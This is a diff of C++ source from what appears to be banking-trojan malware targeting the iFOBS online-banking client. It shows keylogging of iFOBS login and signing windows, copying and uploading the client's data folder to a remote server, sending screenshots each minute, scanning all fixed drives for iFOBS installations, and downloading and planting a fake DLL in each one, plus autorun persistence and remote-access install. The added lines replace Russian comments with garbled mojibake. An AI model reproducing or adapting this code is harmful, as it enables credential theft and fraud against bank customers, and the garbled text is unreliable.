-	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", tempFolder );
+	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2-пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "\0\0"
 	*((int*)&(folderIFobs[ m_lstrlen(folderIFobs) ])) = 0; 
 	CopyFileANdFolder( folderIFobs, tempFolder );
-	DBG( "IFobs", "Копирование на сервер" );
-	//удаляем ненужные папки
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	const char* DelFolders[] = { "DATA", "OldVersion", 0 };
 	int i = 0;
 	while( DelFolders[i] )
 	{
 		pPathAppendA( tempFolder, DelFolders[i] );
 		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
-		DBG( "IFobs", "Удаление папки %s", tempFolder );
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", tempFolder );
 		DeleteFolders(tempFolder);
 		pPathRemoveFileSpecA(tempFolder);
 		i++;
@@ -587,21 +598,21 @@ DWORD WINAPI SendIFobs(LPVOID)
 	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
 	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
 	DeleteFolders(tempFolder);
-	DBG( "IFobs", "Копирование на сервер окончено" );
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	return 0;
 }
 
-//активация при регистариции
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void Activeted1(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated1" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
 //	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
 		MegaJump(SendIFobs);
-	VideoProcess::UpdateSettings( 0, 0, 0, 24 * 60 ); //бот не должен отключаться от видео сервера
+	VideoProcess::UpdateSettings( 0, 0, 0, 24 * 60 ); //пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	typeActive = 1;
 }
-//активация при подписывании
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void Activeted2(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated2" );
@@ -615,9 +626,9 @@ bool Init( const char* appName )
 	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
 	if( S != NULL )
 	{
-		DBG( "IFobs", "Регистрация системы" );
-		//фильтр на форму регистрации
-//		char* caption11 = "*iFOBS*ст*ац*я*";
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//		char* caption11 = "*iFOBS*пїЅпїЅ*пїЅпїЅ*пїЅ*";
 //		char* caption12 = "*iFOBS*Regis*";
 		char* caption11 = "*iFOBS*";
 		char* classWnd1 = "*TLoginForm*";
@@ -627,15 +638,15 @@ bool Init( const char* appName )
 		S->OnMessage = OnMessage;
 		
 		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, classWnd1, caption11, FILTRATE_PARENT_WND, LOG_ALL, 5);
-		m_lstrcpy( folderIFobs, appName ); //копируем путь к iFOBSClient.exe
-		pPathRemoveFileSpecA(folderIFobs); //папка с прогой
+		m_lstrcpy( folderIFobs, appName ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ iFOBSClient.exe
+		pPathRemoveFileSpecA(folderIFobs); //пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if( F1 )
 		{
 			//KeyLogger::AddFilterText(F1, NULL, caption12 );
 			F1->OnActivate = Activeted1;
 		}
-		//фильтр на форму подписывания
-//		char* caption21 = "*дписат*мен*"; //"подписать от имени", "Підписати від імені"
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//		char* caption21 = "*пїЅпїЅпїЅпїЅпїЅпїЅ*пїЅпїЅпїЅ*"; //"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ", "ПіпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ"
 //		char* caption22 = "Sign*";
 		char* caption21 = "*..*";
 		char* classWnd2 = "*TSignAsForm*";
@@ -645,7 +656,7 @@ bool Init( const char* appName )
 			//KeyLogger::AddFilterText(F2, NULL, caption22 );
 			F2->OnActivate = Activeted2;
 		}
-		//запускаем в отдельном потоке загрузку и установку плагина, ждем не более 10с
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 10пїЅ
 		pluginInstalled = 0;
 		RunThread( LoadPluginIFobs, 0 );
 		for( int i = 0; i < 100; i++ )
@@ -661,7 +672,7 @@ bool Init( const char* appName )
 #ifdef AmmyyH
 		Ammyy::Install(false);
 #endif 
-		VideoProcess::SetAutorun(true); //после ребута сконектиться с сервером
+		VideoProcess::SetAutorun(true); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		VideoProcess::ConnectToServer(0);
 	}
 	return true;
@@ -683,14 +694,14 @@ static void FindIFobsClient(TBotStrings* clients)
 	char* ret = 0;
 	DWORD drives = (DWORD)pGetLogicalDrives();
 	char drive[] = { 'C', ':', '\\', 0 };
-	//ищем только на жестком диске
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	for( int b = 2; b < 31; b++ )
 	{
 		if( drives & (1 << b) )
 		{
 			drive[0] = 'A' + b;
 			int tp = (int)pGetDriveTypeA(drive);
-			//смотрим только жесткие диски
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if( tp == DRIVE_FIXED )
 			{
 				if( !SearchFiles( drive, "*.exe", true, FA_ANY_FILES, clients, FindExe ) )
@@ -720,7 +731,7 @@ DWORD WINAPI KillIFobs( void* p )
 	return 0;
 }
 
-//создает файл подмены ifobs.dat
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ifobs.dat
 void CreateFileReplacing( const char* s )
 {
 	if( s == 0 ) return;
@@ -728,7 +739,7 @@ void CreateFileReplacing( const char* s )
 	GetWorkFolder( ifobsIni, "ifobs.ini" );
 	const char* end = s + m_lstrlen(s);
 	const char* p = s;
-	//ставим вместо пробелов переводы строк
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	int i = 0;
 	while( p < end && namesIni[i].app )
 	{
@@ -742,7 +753,7 @@ void CreateFileReplacing( const char* s )
 		while( *p == ' ' ) p++;
 		i++;
 	}
-	DBG( "IFobs", "Обновили файл '%s'", ifobsIni );
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ '%s'", ifobsIni );
 	VideoProcess::RecordPID( 0, "IFobs", GetProcessIdByHash(PROCESS_HASH) );
 }
 
@@ -758,23 +769,23 @@ DWORD WINAPI InstallFakeDll(void*)
 	};
 	if( BOT::FakeDllIFobsInstalled() ) 
 	{
-		DBG( "IFobs", "fake.dll уже установлена" );
+		DBG( "IFobs", "fake.dll пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0; 
 	}
 
-	//на компе может быть много клиентов ифобса, ищем все и заражаем все
+	//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	TBotStrings clients;
 	FindIFobsClient(&clients);
-	if( clients.Count() == 0 ) return 0; //ифобса нет
+	if( clients.Count() == 0 ) return 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 
-	DBG("IFobs", "Начинаем инсталяцию fake.dll");
+	DBG("IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ fake.dll");
 	
 	TPlugin intaller(GetStr(EStrFakeDllInstaller));
 
-	// Загружаем плагин
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!intaller.Download(true))
 	{
-		DBG("IFobs", "Плагин не удалось загрузить" );
+		DBG("IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0;
 	}
 
@@ -782,9 +793,9 @@ DWORD WINAPI InstallFakeDll(void*)
 	DWORD dllSize;
 	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;
 
-	DBG("IFobs", "Плагин успешно загружены, начинаем инсталцию");
+	DBG("IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
-	// Запускаем инсталяцию
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	typedef BOOL (WINAPI *TInstall2)(const char* nameDll, BYTE* dllBody, DWORD dllSize);
 
 	TInstall2 install;
@@ -792,7 +803,7 @@ DWORD WINAPI InstallFakeDll(void*)
 	{
 		char folderClient[MAX_PATH];
 		bool installed = false;
-		//выделяем место для бот плага
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		BYTE* botData = (BYTE*)MemAlloc(dllSize);
 		if( botData )
 		{
@@ -801,20 +812,20 @@ DWORD WINAPI InstallFakeDll(void*)
 				m_lstrcpy( folderClient, clients[i].t_str() );
 				DWORD rand = (DWORD)pGetTickCount();
 				int n = rand % ARRAYSIZE(dlls);
-				for( int j = 0; j < 5; j++ ) //делаем 5 попыток установки, ошибка в инсталяции может быть из-за отсутствия нужной длл, на следующей попытке будет выбрана другая
+				for( int j = 0; j < 5; j++ ) //пїЅпїЅпїЅпїЅпїЅпїЅ 5 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				{
 					pPathRemoveFileSpecA(folderClient);
 					pPathAppendA( folderClient, dlls[n] );
 					m_memcpy( botData, dllBody, dllSize );
 					if( install( folderClient, botData, dllSize ) )
 					{
-						DBG("IFobs", "Инсталяция fake.dll для '%s' успешно выполнена", clients[i].t_str() );
+						DBG("IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ fake.dll пїЅпїЅпїЅ '%s' пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", clients[i].t_str() );
 						installed = true;
 						break;
 					}
 					else
 					{
-						DBG("IFobs", "Инсталяция fake.dll для '%s' не выполнена", clients[i].t_str() );
+						DBG("IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ fake.dll пїЅпїЅпїЅ '%s' пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", clients[i].t_str() );
 						n++;
 						if( n >= ARRAYSIZE(dlls) ) n = 0;
 					}
@@ -831,15 +842,15 @@ DWORD WINAPI InstallFakeDll(void*)
 	return 0;
 }
 
-//отсылка скриншотов формируемых плагином
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static DWORD WINAPI SendScreenshot(void*)
 {
-	char pathScr[MAX_PATH]; //папка скриншотов
+	char pathScr[MAX_PATH]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	GetWorkFolder( pathScr, "scr" );
 	for(;;)
 	{
-		pSleep( 60 * 1000 ); //каждую минуту делаем отправку
-		//отправляем содержимое папки и следом удаляем файлы
+		pSleep( 60 * 1000 ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		VideoProcess::SendFiles( 0, "ifobs_scr", pathScr, 1, 0 );
 	}
 }
